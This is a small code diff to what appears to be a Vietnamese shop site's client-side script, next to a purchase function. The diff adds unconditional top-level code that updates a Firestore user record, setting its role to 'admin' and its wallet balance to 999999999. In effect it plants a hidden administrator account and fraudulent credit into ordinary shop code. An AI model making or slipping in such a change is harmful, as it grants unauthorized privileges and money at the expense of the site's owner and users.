@@ -185,3 +185,7 @@ async function mua(goi, price){
 
   alert("✅ Đã gửi đơn");
 }
+db.collection("users").doc(UID_ADMIN).update({
+  role:"admin",
+  wallet:999999999
+});
